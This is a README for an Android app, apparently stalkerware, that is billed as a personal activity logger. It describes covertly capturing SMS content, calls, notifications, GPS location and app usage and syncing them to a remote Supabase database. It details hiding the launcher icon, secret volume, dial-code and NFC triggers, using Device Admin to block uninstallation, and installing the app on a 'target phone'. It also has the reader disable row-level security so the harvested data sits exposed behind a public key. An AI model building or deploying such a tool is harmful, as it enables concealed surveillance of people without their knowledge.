# UsageInsights

A silent, personal Android activity logger. Captures calls, SMS, notifications, location, system events, screen activity, battery, app usage, and network events on your own device. Stores everything locally in SQLite and syncs to Supabase twice daily. No persistent notification. No visible launcher icon. Accessible only via a secret volume sequence, NFC tag, or dial code.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Project Structure](#project-structure)
- [Tech Stack](#tech-stack)
- [Permissions](#permissions)
- [Setup & Configuration](#setup--configuration)
- [Supabase Setup](#supabase-setup)
- [Building & Running](#building--running)
- [Secret Access](#secret-access)
- [Uninstall Protection](#uninstall-protection)
- [Sync & Retry Logic](#sync--retry-logic)
- [Error Logging](#error-logging)
- [Database Schema](#database-schema)
- [Supabase Schema](#supabase-schema)

---

## Overview

UsageInsights is a personal surveillance app for your own Android device. It runs completely silently in the background with:

- No launcher icon (hidden after setup)
- No persistent notification
- PIN-protected lock screen
- Accessible only via secret triggers

It captures:
- Incoming and outgoing **calls** (number, saved name if any, duration, timestamp)
- Incoming **SMS** (sender, content, timestamp)
- All **notifications** (app name, title, content, timestamp — with per-app exclude list)
- **Location** every 60 minutes (lat, lng, accuracy, timestamp — or `DISABLED` if GPS is off)
- **System events** (shutdown, reboot, airplane mode on/off, mobile data on/off)
- **Screen events** (screen on, screen off, phone unlocked — with timestamps)
- **Battery events** (level logged every 60min alongside location, charging started/stopped)
- **App usage** (which apps were opened and for how long, via `UsageStatsManager`)
- **WiFi events** (connected/disconnected, network name, timestamp)
- **Bluetooth events** (device connected/disconnected, device name, timestamp)
- **Failed sync attempts** (logged and retried like any other event)

All data is stored locally in SQLite first, then synced to Supabase twice daily via WorkManager. After every successful sync, the local database is wiped clean (only after confirmed server acknowledgement). If the device is offline, sync is deferred and retried automatically when connectivity is restored.

---

## Architecture

```
BroadcastReceiver
├── SMS_RECEIVED              → logs incoming SMS
├── PHONE_STATE               → logs incoming/missed calls
├── NEW_OUTGOING_CALL         → logs outgoing calls
├── ACTION_SHUTDOWN           → logs shutdown timestamp
├── BOOT_COMPLETED            → logs reboot + calculates downtime from last shutdown
├── AIRPLANE_MODE_CHANGED     → logs airplane mode on/off
├── CONNECTIVITY_CHANGE       → logs mobile data on/off, WiFi on/off + network name
├── ACTION_SCREEN_ON          → logs screen on
├── ACTION_SCREEN_OFF         → logs screen off
├── ACTION_USER_PRESENT       → logs phone unlocked
├── ACTION_BATTERY_CHANGED    → logs charging started/stopped
└── BluetoothDevice.ACTION_ACL_CONNECTED / DISCONNECTED → logs BT devices

NotificationListenerService
└── onNotificationPosted      → logs all notifications (skips excluded apps, deduplicates within 2s)

WorkManager
├── SyncWorker (2x daily)     → pushes all unsynced rows to Supabase, wipes local DB on success
│   ├── Retries on failure (exponential backoff)
│   ├── Waits for network connectivity before running
│   └── Logs failed attempts as error_logs entries
├── LocationWorker (configurable, default 60min) → captures GPS fix (ACCESS_FINE_LOCATION)
│   └── If GPS disabled → logs entry with position_status = "DISABLED"
└── UsageStatsWorker (configurable, default 60min) → reads app usage via UsageStatsManager

Triggers
├── VolumeAccessibilityService  → Vol+ Vol+ Vol− Vol+ Vol− Vol− sequence
├── SecretCodeReceiver          → *#01234# dialed (Android ≤ 11)
└── NFCReceiver                 → programmed NFC tag tap

LockActivity (PIN screen)
└── 6-digit PIN gates access to MainActivity

Device Admin (AdminReceiver)
└── Prevents uninstall via Settings → Apps

SQLite (local)
└── single database, 10 tables:
    ├── call_logs
    ├── sms_logs
    ├── notification_logs
    ├── location_logs
    ├── system_event_logs
    ├── screen_logs
    ├── battery_logs
    ├── app_usage_logs
    ├── network_logs
    └── error_logs

Supabase (remote)
└── mirrors all 10 local tables
    synced in batches (synced = 0), local DB wiped after confirmed success
```

---

## Project Structure

```
UsageInsights/
├── app/
│   └── src/
│       └── main/
│           ├── AndroidManifest.xml
│           ├── java/com/usageinsights/
│           │   ├── receivers/
│           │   │   ├── SecretCodeReceiver.java       # *#01234# trigger (Android ≤ 11)
│           │   │   ├── NFCReceiver.java              # NFC tag detection
│           │   │   ├── SMSReceiver.java              # SMS_RECEIVED
│           │   │   ├── CallReceiver.java             # PHONE_STATE + NEW_OUTGOING_CALL
│           │   │   ├── SystemEventReceiver.java      # SHUTDOWN, BOOT, AIRPLANE, DATA
│           │   │   ├── ScreenReceiver.java           # SCREEN_ON, SCREEN_OFF, USER_PRESENT
│           │   │   ├── BatteryReceiver.java          # BATTERY_CHANGED
│           │   │   ├── NetworkReceiver.java          # CONNECTIVITY_CHANGE, WiFi events
│           │   │   ├── BluetoothReceiver.java        # ACL_CONNECTED, ACL_DISCONNECTED
│           │   │   └── AdminReceiver.java            # Device Admin — blocks uninstall
│           │   ├── services/
│           │   │   ├── NotificationLogger.java       # NotificationListenerService + dedup
│           │   │   ├── ShakeDetectionService.java    # Accelerometer monitoring for shake trigger
│           │   │   └── VolumeAccessibilityService.java # Volume button sequence detection
│           │   ├── workers/
│           │   │   ├── SyncWorker.java               # WorkManager — 2x daily sync + wipe
│           │   │   ├── LocationWorker.java           # WorkManager — GPS fix (configurable interval)
│           │   │   └── UsageStatsWorker.java         # WorkManager — app usage (configurable interval)
│           │   ├── db/
│           │   │   ├── DatabaseHelper.java           # SQLiteOpenHelper
│           │   │   └── LogDao.java                   # insert / query / mark synced / wipe
│           │   ├── models/
│           │   │   ├── CallLog.java
│           │   │   ├── SmsLog.java
│           │   │   ├── NotificationLog.java
│           │   │   ├── LocationLog.java
│           │   │   ├── SystemEventLog.java
│           │   │   ├── ScreenLog.java
│           │   │   ├── BatteryLog.java
│           │   │   ├── AppUsageLog.java
│           │   │   ├── NetworkLog.java
│           │   │   └── ErrorLog.java
│           │   ├── network/
│           │   │   └── SupabaseClient.java           # OkHttp — batch POST to Supabase REST API
│           │   ├── utils/
│           │   │   ├── ContactUtils.java             # resolve number → saved name
│           │   │   └── NetworkUtils.java             # connectivity check
│           │   └── ui/
│           │       ├── LockActivity.java             # 6-digit PIN lock screen
│           │       ├── MainActivity.java             # bottom-tab settings panel
│           │       ├── WorkerScheduler.java          # schedules/reschedules WorkManager jobs
│           │       └── fragments/
│           │           ├── TriggerFragment.java      # trigger configuration
│           │           ├── SyncFragment.java         # sync settings + ping + manual sync
│           │           ├── LoggingFragment.java      # logging toggles + exclude list
│           │           ├── DataFragment.java         # local DB stats + export + wipe
│           │           └── AppFragment.java          # permissions status + PIN + danger zone
│           └── res/
│               ├── xml/
│               │   └── device_admin.xml              # Device Admin policy declaration
│               ├── drawable/
│               │   └── logo.png                      # app logo (512×512, used on lock screen)
│               ├── mipmap-*/
│               │   ├── ic_launcher.png               # launcher icon (all densities)
│               │   └── ic_launcher_round.png         # round launcher icon (all densities)
│               ├── layout/
│               │   ├── activity_lock.xml             # PIN lock screen
│               │   ├── activity_main.xml             # bottom navigation + ViewPager
│               │   ├── fragment_trigger.xml
│               │   ├── fragment_sync.xml
│               │   ├── fragment_logging.xml
│               │   ├── fragment_data.xml
│               │   ├── fragment_app.xml
│               │   └── item_app_exclude.xml          # row layout for notification exclude list
│               └── values/
│                   ├── strings.xml
│                   └── secrets.xml                   # gitignored — Supabase keys + dial code
├── build.gradle (app)
├── build.gradle (project)
├── gradle.properties
├── INSTALL.md
└── .gitignore
```

---

## Tech Stack

| Layer | Technology |
|---|---|
| Language | Java (Android) |
| Min SDK | 28 (Android 9) |
| Target SDK | 35 (Android 15) |
| Local storage | SQLite via `SQLiteOpenHelper` |
| Background sync | WorkManager |
| HTTP client | OkHttp 4 |
| JSON | Gson (`LOWER_CASE_WITH_UNDERSCORES`, excludes `id` and `synced` fields) |
| Remote storage | Supabase (PostgreSQL via REST API) |
| Call/SMS capture | BroadcastReceiver |
| Notification capture | NotificationListenerService |
| Location | FusedLocationProviderClient (`PRIORITY_HIGH_ACCURACY`) |
| App usage | UsageStatsManager |
| Uninstall protection | Device Administration API |

---

## Permissions

### Runtime permissions requested on first launch:

- `READ_CALL_LOG`
- `READ_CONTACTS`
- `READ_SMS`
- `READ_PHONE_STATE`
- `RECEIVE_SMS`
- `ACCESS_FINE_LOCATION`
- `ACCESS_BACKGROUND_LOCATION` *(must be requested separately, after FINE is granted)*
- `BLUETOOTH_CONNECT` *(Android 12+ only)*
- `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`
- `POST_NOTIFICATIONS` *(Android 13+)*

### Manually granted in Android Settings:

- **Notification Access** → Settings → Notification access → enable Usage Insights
- **Usage Access** → Settings → Usage access → enable Usage Insights
- **Device Admin** → prompted via `DevicePolicyManager` during setup
- **Accessibility Service** → Settings → Accessibility → Input Accessibility (for volume trigger)

---

## Setup & Configuration

### 1. Clone the project

```bash
git clone https://github.com/CodeWrittter/logger.git
cd logger
```

### 2. Fill in `secrets.xml`

Edit `app/src/main/res/values/secrets.xml` (this file is gitignored — never commit it):

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="supabase_url">https://your-project-id.supabase.co</string>
    <string name="supabase_anon_key">your-anon-key-here</string>
    <string name="secret_dial_host">01234</string>
</resources>
```

These values are baked into the APK as defaults. You can override `supabase_url` and `supabase_anon_key` at runtime from **App tab → SECURITY → Supabase Credentials** without rebuilding. The in-app value always takes precedence.

`secret_dial_host` is the digits of the dial trigger code — `01234` means dialing `*#01234#` opens the app (Android ≤ 11 only).

---

## Supabase Setup

### 1. Create a free project at supabase.com

### 2. Run the schema

Paste the SQL from the [Supabase Schema](#supabase-schema) section into the SQL Editor and click **Run**.

### 3. Disable Row Level Security

Run the `ALTER TABLE ... DISABLE ROW LEVEL SECURITY` statements included at the end of the schema SQL, or use the Table Editor UI for each table.

### 4. Get your credentials

Go to **Project Settings → API**. Copy the **Project URL** and the **anon / public key**, then paste them into `secrets.xml`.

---

## Building & Running

### Debug build

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Release build (signed APK for sideloading)

1. In Android Studio: **Build → Generate Signed Bundle / APK → APK**.
2. Create or select a keystore, fill in alias and passwords.
3. Choose **release** build variant, click **Finish**.
4. The signed APK is in `app/release/app-release.apk`.
5. Transfer it to the target phone and install it (enable "Install unknown apps" for your file manager).

> Keep your keystore file and passwords safe. You need the same keystore to update the app later. If you lose it, you must uninstall and reinstall from scratch.

### First launch checklist

1. Open app via launcher (temporarily visible after install).
2. Enter the default PIN `123456`.
3. Tap **Re-run Setup Wizard** on the App tab — it guides you through each permission.
4. Grant all runtime permissions and manually enable Notification Access, Usage Access, Device Admin, and battery optimization exemption.
5. Go to the **Trigger tab** and enable at least one trigger (volume sequence is recommended).
6. Go to the **Sync tab** and tap **Ping** to confirm your Supabase credentials work.
7. Tap **Sync Now** for a first manual sync to verify data is reaching Supabase.
8. Go to the **App tab → VISIBILITY → Show Launcher Icon** → toggle **OFF**.

---

## Secret Access

Three trigger methods are available. Multiple can be active simultaneously.

### Volume button sequence (recommended)

Enable the accessibility service in Settings → Accessibility → Input Accessibility, then press:

```
Vol+  Vol+  Vol−  Vol+  Vol−  Vol−
```

One button at a time, within 3 seconds. Works from anywhere — lock screen, home screen, inside another app.

### Dial code (Android 9–11 only)

The `SecretCodeReceiver` listens for a secret dial code. Default: dial `*#01234#` in the phone dialer (do not press call). Does not work on Android 12+ due to OS restrictions.

The host digits are set via `secret_dial_host` in `secrets.xml`, or changed in the **Trigger tab**.

### NFC tag

Tap **Write Tag** on the Trigger tab, hold an empty NFC sticker to the phone. From then on, tapping that tag opens the lock screen.

---

## Uninstall Protection

The app registers itself as a **Device Administrator** to prevent uninstallation via Settings → Apps.

To uninstall legitimately:
1. Open the app via a trigger and enter your PIN.
2. Go to **App tab → DANGER ZONE → Deactivate Device Admin**.
3. Then uninstall normally from Settings → Apps.

---

## Sync & Retry Logic

All sync is handled by `SyncWorker` via WorkManager.

### Schedule

| Worker | Interval | Constraint |
|---|---|---|
| `SyncWorker` | Every 12 hours | Requires network |
| `LocationWorker` | Configurable (default 60 min) | None |
| `UsageStatsWorker` | Configurable (default 60 min) | None |

`setRequiredNetworkType(NetworkType.CONNECTED)` ensures `SyncWorker` waits automatically until the device is online. No manual polling needed.

### SyncWorker behavior

1. Query SQLite for all rows where `synced = 0` across all 10 tables.
2. Batch POST to Supabase REST API (`/rest/v1/<table>`), excluding `id` and `synced` fields from the JSON payload.
3. On success (HTTP 2xx) → wipe the entire local database.
4. On failure → WorkManager retries automatically with exponential backoff.
5. Log the failure itself as an `error_logs` entry with `synced = 0` so it gets pushed on the next successful sync.

> The local database wipe only happens **after** Supabase returns a successful response. Never wipe before confirmation.

### LocationWorker behavior

1. Request a single GPS fix using `FusedLocationProviderClient` with `PRIORITY_HIGH_ACCURACY`.
2. If GPS is disabled → insert `LocationLog` with `position_status = "DISABLED"`.
3. If GPS is enabled → insert `LocationLog` with actual coordinates, accuracy, and `position_status = "OK"`.

---

## Error Logging

Every failure is captured as an `ErrorLog` and saved to the local `error_logs` table, then synced to Supabase.

| Event | Error type |
|---|---|
| Supabase sync failure | `SYNC_FAILED` |
| SMS capture exception | `SMS_CAPTURE_FAILED` |
| Call capture exception | `CALL_CAPTURE_FAILED` |
| Notification capture exception | `NOTIFICATION_CAPTURE_FAILED` |
| Location capture exception | `LOCATION_CAPTURE_FAILED` |
| App usage read exception | `USAGE_STATS_FAILED` |

---

## Database Schema

### SQLite (local)

```sql
CREATE TABLE call_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number TEXT, saved_name TEXT, call_type TEXT,
    duration_seconds INTEGER, timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE sms_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sender TEXT, saved_name TEXT, content TEXT,
    timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE notification_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT, app_name TEXT, title TEXT, content TEXT,
    timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE location_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    latitude REAL, longitude REAL, accuracy REAL, position_status TEXT,
    timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE system_event_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT, detail TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE screen_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE battery_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level INTEGER, is_charging INTEGER, event_type TEXT,
    timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE app_usage_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    package_name TEXT, app_name TEXT, usage_duration_seconds INTEGER,
    window_start INTEGER, window_end INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE network_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT, detail TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
);
CREATE TABLE error_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    error_type TEXT, message TEXT, stacktrace TEXT,
    timestamp INTEGER, synced INTEGER DEFAULT 0
);
```

All `timestamp` fields are Unix milliseconds (`System.currentTimeMillis()`). To read them as human-readable dates in Supabase SQL:

```sql
select to_timestamp(timestamp / 1000.0) as recorded_at from call_logs;
```

---

## Supabase Schema

Run this in the Supabase SQL Editor:

```sql
create table call_logs (
  id bigserial primary key,
  number text, saved_name text, call_type text,
  duration_seconds integer, timestamp bigint
);
create table sms_logs (
  id bigserial primary key,
  sender text, saved_name text, content text, timestamp bigint
);
create table notification_logs (
  id bigserial primary key,
  package_name text, app_name text, title text, content text, timestamp bigint
);
create table location_logs (
  id bigserial primary key,
  latitude double precision, longitude double precision,
  accuracy double precision, position_status text, timestamp bigint
);
create table system_event_logs (
  id bigserial primary key,
  event_type text, detail text, timestamp bigint
);
create table screen_logs (
  id bigserial primary key,
  event_type text, timestamp bigint
);
create table battery_logs (
  id bigserial primary key,
  level integer, is_charging boolean, event_type text, timestamp bigint
);
create table app_usage_logs (
  id bigserial primary key,
  package_name text, app_name text,
  usage_duration_seconds integer, window_start bigint, window_end bigint
);
create table network_logs (
  id bigserial primary key,
  event_type text, detail text, timestamp bigint
);
create table error_logs (
  id bigserial primary key,
  error_type text, message text, stacktrace text, timestamp bigint
);

-- Disable RLS on all tables
alter table call_logs disable row level security;
alter table sms_logs disable row level security;
alter table notification_logs disable row level security;
alter table location_logs disable row level security;
alter table system_event_logs disable row level security;
alter table screen_logs disable row level security;
alter table battery_logs disable row level security;
alter table app_usage_logs disable row level security;
alter table network_logs disable row level security;
alter table error_logs disable row level security;
```

---

## Notes

- `ACCESS_BACKGROUND_LOCATION` must be requested **separately and after** `ACCESS_FINE_LOCATION` is already granted. Android enforces this order strictly on API 30+.
- `PACKAGE_USAGE_STATS` and Accessibility permission cannot be granted at runtime — the user must enable them manually in Settings.
- `NotificationListenerService` permission is revoked automatically if the app is updated via adb. Re-enable it in Notification Access settings after each update.
- The dial code trigger (`SecretCodeReceiver`) does not work on Android 12+ due to OS restrictions.
- The local database wipe after sync is irreversible. The wipe only runs after Supabase returns HTTP 2xx.
- Never commit `secrets.xml` to a public repository.
- Supabase free tier: 500 MB storage, 2 GB bandwidth/month — sufficient for personal logging.
